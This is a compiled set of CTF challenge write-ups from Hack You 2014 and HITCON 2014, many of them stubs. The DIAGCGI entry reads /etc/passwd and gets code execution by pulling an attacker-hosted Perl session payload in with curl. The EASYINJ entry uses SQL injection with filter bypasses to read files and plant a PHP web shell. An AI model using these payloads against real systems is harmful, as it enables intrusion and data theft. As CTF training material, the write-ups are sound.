* [Jailbreaker](network/200)
* [Matrix](crypto/300)
* [Newbie calculations](reverse/200)
* [NotEasyTask](reverse/100)
* [PCAP](network/100)
* [PHPwning](web/400)
* [Play with me](ppc/200)
* [Snake](web/200)
* [Voting](web/100)
* [Trash](ppc/100)

## Missing write-ups

* none yet
# Hack You CTF 2014: NotEasyTask

**Category:** Reverse
**Points:** 100
**Author:** Oleg Olshanskiy (Varsag)
**Description:**

> [Crackme](reverse100.exe)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/01/hack-you-2014-ctf-writeup-net100-web100-crypto100-rev100/>
* <http://delimitry.blogspot.ru/2014/01/hack-you-2014-writeups.html>
* <http://hacktracking.blogspot.jp/2014/01/hackyou-2k14-reverse-noteasytask-100.html>
* [Vietnamese](https://ctfwriteup.wordpress.com/2014/01/16/reverse-100-noteasytask/)
# Hack You CTF 2014: Newbie calculations

**Category:** Reverse
**Points:** 200
**Author:** Mike Koveshnikov (Digita1)
**Description:**

> This [file](e5b007f35ad7a081610d6b0770e499cf.exe) will calculate a flag for you, but you have to wait

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/01/hack-you-2014-rev-200-writeup/>
* <http://delimitry.blogspot.ru/2014/01/hack-you-2014-writeups.html>
# Hack You CTF 2014: Enchanter

**Category:** Reverse
**Points:** 300
**Author:** Oleg Olshanskiy (Varsag)
**Description:**

> I asked my friend-wizard to enchance one nice thing, but instead of the improving "my precious", he've just brought some strange defective substance. And do you know?..That bastard can't fix it!
>
> Maybe you are more skilled in magic?
>
> [Reverse 300](reverse300.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
# Hack You CTF 2014: Classic

**Category:** Reverse
**Points:** 400
**Author:** Oleg Olshanskiy (Varsag)
**Description:**

> This is a classic reverse-engineering challenge. Almost...
>
> [Reverse 400](reverse400)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
# Hack You CTF 2014: Voting

**Category:** Web
**Points:** 100
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> http://hackyou2014tasks.ctf.su:10080
>
> UPD after end: [service source code](web100.tar.gz)
> [database dump](web100_sql.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://tasteless.eu/2014/01/hack-you-2014-ctf-writeup-net100-web100-crypto100-rev100/>
* <http://www.pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/>
* <http://delimitry.blogspot.ru/2014/01/hack-you-2014-writeups.html>
* <http://hacktracking.blogspot.jp/2014/01/hackyou-2k14-web-voting-100-points.html>
# Hack You CTF 2014: Snake

**Category:** Web
**Points:** 200
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> Play the game and hack this!
>
> http://hackyou2014tasks.ctf.su:20080
>
> UPD after end: [service source code](web200.tar)
> [database dump](web200_sql.txt)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://tasteless.eu/2014/01/hack-you-2014-web-200/>
* <http://www.pwntester.com/blog/2014/01/15/hackyou2014-web200-write-up/>
# Hack You CTF 2014: AngryBird

**Category:** Web
**Points:** 300
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> Some web-developers still host their sites on Windows platform, and think that it is secure enough
>
> http://hackyou2014tasks.ctf.su:30080
>
> UPD after end: [service source code](web300.rar)

## Write-up

(TODO)

## Other write-ups and resources

* <http://tasteless.eu/2014/01/hack-you-2014-web300-writeup/>
* <http://www.pwntester.com/blog/2014/01/15/hackyou2014-web300-write-up/>
# Hack You CTF 2014: PHPwning

**Category:** Web
**Points:** 400
**Author:** Daniel Sadyrin (cyberguru)
**Description:**

> Pwn this:http://hackyou2014tasks.ctf.su:40080
>
> [Full souce code](web400.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://hackyou.ctf.su/files/irc_writeups.html>
* <http://tasteless.eu/2014/01/hack-you-2014-web400-writeup/>
* <http://www.pwntester.com/blog/2014/01/17/hackyou2014-web400-write-up/>
* <http://thehackerblog.com/hack-you-2014-ctf-writeup-winning-phpwning-web400-the-wrong-way/>
# HITCON CTF 2014: 24

**Category:** Game
**Points:** 256
**Description:**

> Let’s play a game!
>
> ```bash
> $ nc 210.65.89.59 2424
> ```

## Write-up

```bash
$ nc 210.65.89.59 2424
===================================================
===           Welcome to the 24 game!           ===
=== You have 2 minutes to answer all questions. ===
===================================================

Question (1 of 24): [9, 1, 3, 2]
Answer: 9,1,3,2
ERROR!!! Answer should match [-+*/0-9()]+
```

Okay, so we’re supposed to enter digits and some operators only.

```bash
$ nc 210.65.89.59 2424
===================================================
===           Welcome to the 24 game!           ===
=== You have 2 minutes to answer all questions. ===
===================================================

Question (1 of 24): [11, 9, 3, 11]
Answer: 11+9+3+11
ERROR!!! abs(eval(answer) - 24) >= 1e-15
```

Oh, and our input must evaluate to `24`. That makes sense.

```bash
$ nc 210.65.89.59 2424
===================================================
===           Welcome to the 24 game!           ===
=== You have 2 minutes to answer all questions. ===
===================================================

Question (1 of 24): [5, 4, 2, 2]
Answer: 5*4+2+2
Great!
```

Some further testing confirms that this is a Python script:

```bash
$ nc 210.65.89.59 2424
===================================================
===           Welcome to the 24 game!           ===
=== You have 2 minutes to answer all questions. ===
===================================================

Question (1 of 24): [8, 9, 2, 3]
Answer: 8-9-2-3-
Traceback (most recent call last):
  File "/home/twenty-four/server.py", line 54, in <module>
    Main()
  File "/home/twenty-four/server.py", line 40, in Main
    if abs(eval(ans) - 24) >= 1e-15:
  File "<string>", line 1
    8-9-2-3-
           ^
SyntaxError: unexpected EOF while parsing
```

This is useful, because it means we’re not limited to the `-`, `+`, `*`, and `/` operators — we can use Python’s `**` and `//` too!

We have to solve 24 of these puzzles in just 2 minutes. Let’s write a script for it.

(TODO)

```
…

Question (23 of 24): [6, 11, 8, 5]
Answer:
('6', '11', '8', '5')
((6+11)//5)*8
Great!


Question (24 of 24): [13, 4, 1, 13]
Answer:
('13', '4', '1', '13')
13//(13**-(4**-1))
Good job! Here's your flag: HITCON{24_GAme_15_FUN}
```

The flag is `HITCON{24_GAme_15_FUN}`.

## Other write-ups and resources

* <https://gist.github.com/gnomus/4a119910a616b703620a>
* <https://gist.github.com/csferng/cfc18104d9adfa25224f>
# HITCON CTF 2014: badger

**Category:** Misc.
**Points:** 128
**Description:**

> <http://youtu.be/8hDz97kEK_s>

## Write-up

(TODO)

## Other write-ups and resources

* <http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt>
# HITCON CTF 2014: breath

**Category:** Forensics
**Points:** 350
**Description:**

> [http://raw.githubusercontent.com/hitcon2014ctf/ctf/master/breath-a680604456efc02ebaa7ad4f53540efe.zip](breath-a680604456efc02ebaa7ad4f53540efe.zip)
> [https://dl.dropbox.com/s/f8ktjk2tpbe6yg3/breath-a680604456efc02ebaa7ad4f53540efe.zip](breath-a680604456efc02ebaa7ad4f53540efe.zip)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON CTF 2014: callme

**Category:** Pwnable
**Points:** 350
**Description:**

> ```bash
> $ nc 203.66.57.148 9527
> ```
>
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/callme-69d26b77eb41e4eeba1d7b8402a8b165](callme-69d26b77eb41e4eeba1d7b8402a8b165)
> [https://dl.dropbox.com/s/32agxy7q3g4y2ow/callme-69d26b77eb41e4eeba1d7b8402a8b165](callme-69d26b77eb41e4eeba1d7b8402a8b165)

## Write-up

(TODO)

## Other write-ups and resources

* <http://acez.re/ctf-writeup-hitcon-ctf-2014-callme-rsbo-ty-sh41lcode/>
* <https://gist.github.com/g05u/f7d8b6cb045cbb65ab80> -- related [notes]<http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt>
* <http://www.idabook.com/ctf/callme_writeup.txt>
* <https://rzhou.org/~ricky/hitcon2014/callme/>
* <http://tasteless.eu/2014/08/hitcon-ctf-2014-callme-exploiting-350/>
# HITCON CTF 2014: de

**Category:** Strange
**Points:** 450
**Description:**

> Use `nc 54.64.27.35 8000` to get your ssh account on this server(54.64.27.35).
>
> There is a key under `/home/de/key`, and the flag is `HITCON{key}`.
>
> [https://github.com/hitcon2014ctf/ctf/raw/master/62b6b6a8a19a89a3c33801520e0e8b58-de](62b6b6a8a19a89a3c33801520e0e8b58-de)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# HITCON CTF 2014: DIAGCGI

**Category:** Web
**Points:** 68
**Description:**

> http://54.92.127.128:16888/

## Write-up

Entering `file:///etc/passwd` in the form and clicking the `curl` button shows us:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
key:x:1001:1001::/home/key:
```

Let’s try to turn this file disclosure vulnerability into remote command execution. The default location for `cgi-bin` on Ubuntu (gained by reading `/etc/issue`) is `/usr/lib/cgi-bin`; as such we can read `/usr/lib/cgi-bin/dana-na.cgi` and get the following:

```perl
#!/usr/bin/perl -w

use CGI;
use Digest::MD5 qw(md5_hex);

$cgi = new CGI;
$SESSDIR = "/tmp/";
$sessfile = $cgi->cookie("diagsess");
$arg0 = $cgi->param("arg");
$action = $cgi->param("action");
$arg = &safestr($arg0);

if (! defined($sessfile) )
{
	if ( md5_hex($cgi->param("sechash")) =~ /^000000000000.*$/)
	{
		$sesshash{'user'} = 'admin';
	}
	else
	{
		$sesshash{'user'}  = 'guest';
	}
	$sesshash{'ip'} = &get_ip;

	$diagsess = md5_hex( $sesshash{'user'} . '|||' . $sesshash{'ip'} );
	$cookie = "diagsess=$diagsess;";
	&write_session;
	print $cgi->header(-cookie => $cookie,
			-expires => 'Mon, 01 Jan 1999 00:00:00 GMT',
			-'cache-control' => 'no-cache',
			-pragma => 'no-cache',-'location'=> 'dana-na.cgi?sechash=' );

	exit 0;
}
else
{
	print $cgi->header();
	&read_session;
	&print_menu;
}
if (defined ($action) && length($action)>0)
{
	if ($action =~ /^print_session$/)
	{
		&print_session;
		exit 0;
	}
	if ($action =~ /^curl$/)
	{
		&curl($arg);
		exit 0;
	}
	if ($action =~ /^ping$/ )
	{
		&ping($arg);
		exit 0;
	}
	if ($action =~ /^traceroute$/)
	{
		&traceroute ($arg);
		exit 0;
	}
	if ($action =~ /^shell$/)
	{
		&shell($arg);
		exit 0;
	}

}

sub curl
{
	$host = shift;
	print "<pre><textarea rows=24 cols=80>";
	if (defined($host) && length($host)>1)
	{
		open(GG,"/usr/bin/curl -s $host |") and do
		{
			while(<GG>)
			{
				print;
			}
		}
	}
}

sub ping
{
	my $host = shift;
	print "<pre>";
	if(defined($host) && length($host)>1)
	{
		open(GG,"/bin/ping -c3 $host |") and do
		{
			while(<GG>)
			{

				print;
			}

		};
		close GG;

	}
}

sub traceroute
{
	my $host = shift;
	print "<pre>";
	if(defined($host) && length($host)>1)
	{
		open(GG,"/usr/sbin/traceroute -d -n -w 5 $host |") and do
		{
			while(<GG>)
			{
				print;
			}

		};
		close GG;
	}
}

sub read_session
{
	undef %sesshash;
	if(! -f "$SESSDIR/$sessfile")
	{
		print "session error!";
		return;
	}
	open(GG, "$SESSDIR/$sessfile") and do {
		while (<GG>) {
			eval($_);
		}
		close GG;
	};
}

sub write_session
{
	open(GG, ">$SESSDIR/$diagsess") and do
	{
		foreach (sort keys %sesshash)
		{
			print GG "\$sesshash{'$_'} = '$sesshash{$_}';\n";
		}
	};
	close GG;
}

sub print_session
{
	foreach (sort keys %sesshash) {
		print "$_=$sesshash{$_}\n";
	}
}

sub shell
{
	$cmd = shift;
	print "<pre>";
	if (  $sesshash{'user'} eq 'admin' )
	{
		open(GG, "$cmd |") and do
		{
			print;
		};
	}
	else
	{
		print "sorry $sesshash{'user'}! you're not admin!\n";

	}
}

sub print_menu
{
	$arg0 =~ s/\</\<\;/g;
	open(GG,"cat menu.html |") and do
	{
		while(<GG>)
		{
			$_ =~ s/\%\%arg\%\%/$arg0/g;
			print $_;
		}
		close GG;
	};
}

sub get_ip
{
	$h1 = $ENV{'REMOTE_ADDR'};
	$h2 = $ENV{'HTTP_CLIENT_IP'};
	$h3 = $ENV{'HTTP_X_FORWARDED_FOR'};

	if (length($h3)>0)
	{
		return $h3;
	}
	elsif (length($h2)>0)
	{
		return $h2;
	}
	else
	{
		return $h1;
	}
	return "UNKNOWN";
}

sub safestr
{
	my $str = shift;

	$str =~  s/([;<>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;;
	return $str;

}
```

The `read_session` function evaluates everything in the session file, and as we know our cookie, we can read our session file in `/tmp/<cookie>`. Additionally we know it’s possible to create/override files using `curl`’s `-o` output flag and pointing it to our session file. Using similar techniques to the full solution we can run the `ls` command on the server root and see the following:

```
total 988K
drwxr-xr-x 22 root root 4.0K Aug 13 16:29 .
drwxr-xr-x 22 root root 4.0K Aug 13 16:29 ..
drwxr-xr-x 2 root root 4.0K Jul 27 11:15 bin
drwxr-xr-x 3 root root 4.0K Jul 27 11:16 boot
drwxr-xr-x 13 root root 3.9K Aug 13 16:29 dev
drwxr-xr-x 90 root root 4.0K Aug 13 16:29 etc
drwxr-xr-x 3 root root 4.0K Jul 27 05:17 home
lrwxrwxrwx 1 root root 33 Jun 7 10:50 initrd.img -> boot/initrd.img-3.13.0-29-generic
-r-------- 1 key www-data 41 Jul 28 08:37 key.txt
drwxr-xr-x 21 root root 4.0K Jul 28 08:35 lib
drwxr-xr-x 2 root root 4.0K Aug 13 16:29 lib64
drwx------ 2 root root 16K Jun 7 10:51 lost+found
drwxr-xr-x 2 root root 4.0K Jun 7 10:49 media
drwxr-xr-x 2 root root 4.0K Apr 10 22:12 mnt
drwxr-xr-x 2 root root 4.0K Jun 7 10:49 opt
dr-xr-xr-x 155 root root 0 Aug 13 16:29 proc
-r-sr-x--- 1 key www-data 858K Jul 28 08:39 read_key
drwx------ 4 root root 4.0K Aug 16 11:37 root
drwxr-xr-x 19 root root 680 Aug 17 00:20 run
drwxr-xr-x 2 root root 12K Aug 13 16:29 sbin
drwxr-xr-x 2 root root 4.0K Jun 7 10:49 srv
dr-xr-xr-x 13 root root 0 Aug 13 16:29 sys
drwxrwxrwt 2 root root 36K Aug 17 00:33 tmp
drwxr-xr-x 10 root root 4.0K Jun 7 10:49 usr
drwxr-xr-x 13 root root 4.0K Jul 27 11:18 var
lrwxrwxrwx 1 root root 30 Jun 7 10:50 vmlinuz -> boot/vmlinuz-3.13.0-29-generic
```

`key.txt` doesn’t have read permissions for us but the `read_key` binary is `setuid` and we can assume this is how the organizers want us to read the keyfile. In most of these instances where you need to run a binary to read a file they expect the file to be read as an argument.

Leveraging these bits of information we write the following in to a webserver we control:

```perl
$sesshash{'ip'} = 'YOUR.IP.GOES.HERE';
$sesshash{'user'} = 'admin';
system("/read_key /key.txt >> /tmp/test.txt");
```

Then we simply `curl` that into our session file, reload the page to have our session read and then read `/tmp/test.txt` to get the key.

The flag is `HITCON{a755be06b165ed8fc4710d3544fce942}`.

## Other write-ups and resources

* <http://givemesecurity.info/2014/08/18/diagcgi-writeup-hitcon-2014/>
* <https://gist.github.com/connection/f90a01c09601c600a332>, related [notes](http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt)
* <https://rzhou.org/~ricky/hitcon2014/diagcgi/>
# HITCON CTF 2014: ducky

**Category:** Crazy
**Points:** 250
**Description:**

> http://210.61.2.93:9008

**Hint:**

> The environment is same as [challenge "vash"](https://github.com/ctfs/write-ups/tree/master/hitcon-ctf-2014/vash)

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/superbacker/09e38d114cf8fbe32543>, related [notes]()
* <https://rzhou.org/~ricky/hitcon2014/ducky/>
# HITCON CTF 2014: EASYINJ

**Category:** Web
**Points:** 300
**Description:**

> http://54.238.22.67:10653/

## Write-up

When accessing the URL posted in the description, we are immediately forwarded to `http://54.238.22.67:10653/index.php?ip={your public IP address here}`, which displays the output of `phpinfo()`. As there is just one parameter, and the name of the challenge indicates this might be some sort of injection challenge, the first obvious step is to check for MySQL injection. Loading `http://54.238.22.67:10653/index.php?ip='` shows the following error message:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 1 in Z:\AppServ\www\index.php on line 43
```

Now that we know there’s SQL injection, what useful things can we do with this? We can’t see any output of the query, other than the error messages, so things like `UNION SELECT` won’t be any use. After trying a few things, I found that certain keywords appeared to be filtered. For instance, `http://54.238.22.67:10653/index.php?ip='foo.bar` returns:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'foobar')' at line 1 in Z:\AppServ\www\index.php on line 43
```

This shows that `foo.bar` is replaced by `foobar`, meaning that dots were filtered. Some keywords were filtered as well: for instance, `http://54.238.22.67:10653/index.php?ip='fooSELECTbar` gives the same warning as above, meaning that `SELECT` is removed from the query. Luckily the stripping of keywords wasn’t recursive, so in order to get a `SELECT`, you could request `http://54.238.22.67:10653/index.php?ip='fooSSELECTELECTbar`, which would show the following warning:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'fooSELECTbar')' at line 1 in Z:\AppServ\www\index.php on line 43
```

With all this information, we are ready to start extracting some data. It is possible to do this via a time-based attack, using constructs like `SELECT IF (SUBSTR(version(),1,1) = '5', SLEEP(10), 1)`, but this would take ages. [This blog post](http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html) nicely describes how this can be done by generating errors containing the output of a query. I won’t go into detail on how this works exactly, but do refer to the blog post if you’re interested.

Using this error-based technique, we can construct our payload like this:

```
http://54.238.22.67:10653/?ip='-(SSELECTELECT 1 FFROMROM (SSELECTELECT COUNT(1),CONCAT((SSELECTELECT 'test'),FLOOORR(RAANDND(0)*2)) x FFROMROM log GROUP BY x) t1)-'
```

This returns:

```
 Warning: PDO::query() [pdo.query]: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'test1' for key 1 in Z:\AppServ\www\index.php on line 43
```

Note that the error message contains the result of our subquery, namely `test`. We can also run some more useful queries, such as `version()` (result: `5.0.51b-community-nt-log`), `user()` (result: `root@localhost`). Since the current MySQL user is root, we can most likely read files as well, so let’s try it for the `index.php` file:

```
http://54.238.22.67:10653/?ip='-(SSELECTELECT 1 FFROMROM (SSELECTELECT COUNT(1),CONCAT((SSELECTELECT LLOAD_FILEOAD_FILE(0x5a3a2f417070536572762f7777772f696e6465782e706870)),FLOOORR(RAANDND(0)*2)) x FFROMROM log GROUP BY x) t1)-'
```

*Note: Since dots are removed, `Z:/AppServ/www/index.php` is encoded as `0x5a3a2f417070536572762f7777772f696e6465782e706870`.*

This returns:

```
Warning: PDO::query() [pdo.query]: SQLSTATE[21000]: Cardinality violation: 1242 Subquery returns more than 1 row in Z:\AppServ\www\index.php on line 43
```

We can fix this by doing `SUBSTR(LOAD_FILE(...),1,40)`, which shows the first 40 bytes of the `index.php` file: `<?php if (!isset($_SESSION)) { session`. By increasing the offset of `SUBSTR()`, it’s possible to extract the contents of [the complete `index.php` file](index.php).

The `index.php` file shows that `phpinfo()` entries are written to `log_guess^2/{$_SERVER['REMOTE_ADDR']}`. This gives us a directory that might be writable – let’s try uploading a shell there.

Since the query we’re injecting into is `INSERT INTO`, we can’t directly use `SELECT … INTO OUTFILE`. However, it is possible to use stacked queries for this purpose. Because dots are filtered, we will need to use prepared statements to write to a `.php` file. This what I used to write a shell to `Z:/AppServ/www/log_guess^2/inject-this.php`:

```
$ cat query.sql
SELECT '<?php if(isset($_GET["x"])){echo "<pre>".shell_exec($_GET["x"])."</pre>";} ?>' INTO OUTFILE 'Z:/AppServ/www/log_guess^2/inject-this.php'

$ xxd -p < query.sql | tr -d '\n'
0x53454c45435420273c3f70687020696628697373657428245f4745545b2278225d29297b6563686f20223c7072653e222e7368656c6c5f6578656328245f4745545b2278225d292e223c2f7072653e223b7d203f3e2720494e544f204f555446494c4520275a3a2f417070536572762f7777772f6c6f675f67756573735e322f696e6a6563742d746869732e706870270a

$ curl -s "http://54.238.22.67:10653/?ip=');SET @a=0x53454c45435420273c3f70687020696628697373657428245f4745545b2278225d29297b6563686f20223c7072653e222e7368656c6c5f6578656328245f4745545b2278225d292e223c2f7072653e223b7d203f3e2720494e544f204f555446494c4520275a3a2f417070536572762f7777772f6c6f675f67756573735e322f696e6a6563742d746869732e706870270a;PREPARE st FFROMROM @a;EXECUTE st;SSELECTELECT ('"
```

With this shell we can easily find the flag using `http://54.238.22.67:10653/log_guess^2/inject-this.php?x=dir Z:\`. This shows that the flag is located in `Z:\key_39uti2jb.txt`. Using `type` (`http://54.238.22.67:10653/log_guess%5E2/inject-this.php?x=type%20Z:\key_39uti2jb.txt`), we get the flag: `HITCON{a2f7af2ba385ea71bfa597f3aa692368}`.

## Other write-ups and resources

* [Exploiting `INSERT INTO` SQL injections ninja-style](http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html)
# HITCON CTF 2014: finger

**Category:** Crypto
**Points:** 200
**Description:**

> Are you lucky enough?
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/finger-9312e72601ff37116dd1e201e9508dbb.rb](finger-9312e72601ff37116dd1e201e9508dbb.rb)
> [https://dl.dropbox.com/s/oh5yuu25qj7a8ih/finger-9312e72601ff37116dd1e201e9508dbb.rb](finger-9312e72601ff37116dd1e201e9508dbb.rb)
>
> ```bash
> $ nc 210.71.253.236 7171
> ```

## Write-up

This one was fairly easy to solve because of a programming error in the challenge. An updated harder version of the challenge was released during the CTF under the name of [ginger](https://github.com/ctfs/write-ups/tree/master/hitcon-ctf-2014/ginger).

Studying [the provided Ruby code](finger-9312e72601ff37116dd1e201e9508dbb.rb), we learn that we have to play some kind of rock-paper-scissors against the ‘boss’. To make it more difficult, the boss hits for 10-50 dmg while you do only 1-3 dmg. You both have a HP pool of 100.

The program expects a magic input which will be compared to the MD5 hash of your secret (the hand you’ll be playing). All you have to do is just choose a hand, and send the MD5 hash of it as the magic word. After you send the magic word, the program says which hand the boss plays so you can compare it to your own hand.

Because of a programming error, you can give the program a secret (your hand) which wasn’t the one you choose in the beginning. The program will say you’re a cheater but you’ll only receive 1 dmg, which is much better than the 10-50 dmg from the boss in the case you would loose. Thus it is only a matter of writing [a little script which formats the input and decides to either cheat or win/draw the rock-paper-scissor](solution.rb). The netto win rate of this method is something of a 1 dmg per turn so you’ll eventually win if you run the script for long enough.

The flag is `HITCON{you are super lucky OAQ!}`.

## Other write-ups and resources

* <https://gist.github.com/anonymous/c03c72829af36757eddb>
# HITCON CTF 2014: G8LA

**Category:** Forensics
**Points:** 150
**Description:**

> The flag format is HITCON{md5(PASSWORD).lower()}.
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/ggyy-99b3ed3ed5e2a293c697784ac94ee8c6.pcap](ggyy-99b3ed3ed5e2a293c697784ac94ee8c6.pcap)
> [https://www.dropbox.com/s/d6bpgcsk1flbfyt/ggyy-99b3ed3ed5e2a293c697784ac94ee8c6.pcap](ggyy-99b3ed3ed5e2a293c697784ac94ee8c6.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* <http://lockboxx.blogspot.de/2014/08/hitcon-2014-ctf-writeup-g8la-forensics.html>
* [notes](http://cuby.hu/hitcon-lol-notes-then-not-writeups.txt)
# HITCON CTF 2014: ginger

**Category:** Crypto
**Points:** 400
**Description:**

> Are you lucky enough?
>
> ```bash
> $ nc 210.71.253.236 7979
> ```
>
> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/ginger-350e951738280de084cf87d9070356e6.rb](ginger-350e951738280de084cf87d9070356e6.rb)

## Write-up

This problem is the fixed version of the [finger](https://github.com/ctfs/write-ups/tree/master/hitcon-ctf-2014/finger) problem in this CTF which had a bug that allowed you to win fairly easily.
This is a kind of rock-paper-scissors against the ‘boss’, except in the fixed version you can't get out of the damage if you lose, and the damage against the boss is now 1-2 HP.
This means you have to win on average 66 times in 10 minutes, so you have about 9 seconds per round, which makes this problem quite difficult.

If you compare [the provided Ruby
code](ginger-350e951738280de084cf87d9070356e6.rb) with the code for finger
the basics are the same.  The server provides three five-character strings.
The idea is that you select one, and send a proof of your selection.  The
boss reveals his choice at which point you submit your selection.  The trick
is that for your proof you can choose an arbitrary number of 16-character
hashes whose prefix is your choice and submit that *sum* of those hashes as
your proof.  So if you can find a single number whose sum can be generated
in three ways (one for each prefix) you can always win by chosing the
winning choice after the boss reveals his.

There may be other methods, but the way I approached it is as follows. For
each prefix do the following algorithm:

   * Generate a list of random strings, over which you iterate.

   * Consider the MD5 hash of each entry, specifically the last two hex digits
     (i.e. mod 256).  Pair them off so you generate sums which are multiple of 256.
     So for example pair 0x55 with 0xAB.  This will generate a set of
     strings ending in 00.

   * Repeat this process for this new set, to produce strings ending in four
     zeros.  For each of these there are four MD5 hashes which add up to this
     number.

   * Keep repeating this process to level 16 until you have sets of 65,536
     hashes which add up to number ending in 32 zeros.  By the law of
     averages it will be around 32,000 times 2^128.

The code looks like:

```python
    def insert(self, level, hashsum, hashsumtxt, lst):
        if level == 16:
            if (hashsumtxt, 2**16) not in self.options:
                 lst = self.collapse(lst)
                 self.options[(hashsumtxt, len(lst))] = lst
            return
        n = int(hashsumtxt[-level*2-2:][:2], 16)
        if (256-n) in self.data[level]:
            oldhashsum, oldlst = self.data[level][256-n]
            newhashsum = oldhashsum + hashsum
            newhashsumtxt = "%X" % newhashsum
            self.insert(level+1, newhashsum, newhashsumtxt, (oldlst, lst))
        self.data[level][n] = (hashsum, lst)

    def run(self):
        for s, h in make_hashes(self.prefix):
            self.insert(0, int(h, 16), h, [(s,h)])
            if len(self.options) >= OPTION_COUNT:
                break
        return self.options
```

This is where it gets tricky. Due to random variation you don't always get
very near 32,768*2^128, but something close.  Therefore there is a very real
chance the ranges generated for the three prefixes don't overlap.

You can reduce the spread by repeating the processes a 17th time but then
you run into another problem.  You have to send 131,072 hashes of length 16
which works out to 2MB of data.  Sending this to the server takes time as
does processing it.  During the CTF this took about 8 seconds, which is
essentially the entire budget you have per round.  This also meant writing
it in C wouldn't help.  You have to make it work in 16 rounds, which takes 4
seconds of processing.

This is essentially where I got stuck during the CTF (my team didn't solve
it).  However, after the CTF finished the server remained running, which
allowed me to test a few ideas.

This trick eventually turned out to be to control the combining of the pairs
better.  The above algorithm will tend to magnify random biases during the
generation of the hashes.  Basically, we try to steer the summing of the
pairs by looking at the first 16 bits of the sum.

What you do is that for the first level there is no restriction. After one
addition we halve the allowed range so it has to be between 0x4000 and
0xC000, and do this again for each level, so that after 16 levels there is
only one allowed prefix, 0x8000.  At each level there is only a 25% the sum
will fall outside, so it doesn't have a huge effect on the generation time.
But it does mean that at the end of the algorithm we always get 65,536
hashes which add to the same sum:
0x8000_0000_0000_0000_0000_0000_0000_0000_0000.  It manages this in a bit
under a second on my machine.  Note that you only need to generate around
30,000 hashes to reach this result.  The hash generation is not the limiting
factor here.

The changed code looks like:

```python
        if (256-n) in self.data[level]:
            oldhashsum, oldlst = self.data[level][256-n]
            newhashsum = oldhashsum + hashsum
            t = newhashsum >> (128-16+level+1)               # NEW
            if (-32678) <= (t-32768)<<(level) < (32768):     # NEW
                newhashsumtxt = "%X" % newhashsum
                self.insert(level+1, newhashsum, newhashsumtxt, (oldlst, lst))
```

With this change, a stable internet connection, parallelisation and a dose
of luck, this program won with 10 seconds to spare.  The flag is
`HITCON{shik is a stupid guy -.-}`, presumably a reference to the maker of
the original faulty challenge.

NB I'm truly curious if there is a way to solve this challenge in a way that
requires significantly fewer hashes to be sent.  This feels almost like
brute forcing the problem.  Certainly the really tight 10 minute time limit
where about half the time is spend sending hashes suggests there is a
significantly better way.  Also the server doesn't require all the hashes to
have the same prefix, though it's not clear to me that you can use this in
any way.

## Other write-ups and resources

* none yet
# HITCON CTF 2014: girby

**Category:** Reverse
**Points:** 450
**Description:**

> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/girby-86c7d5a294f9b8d67b2dc614ff143b70](girby-86c7d5a294f9b8d67b2dc614ff143b70)
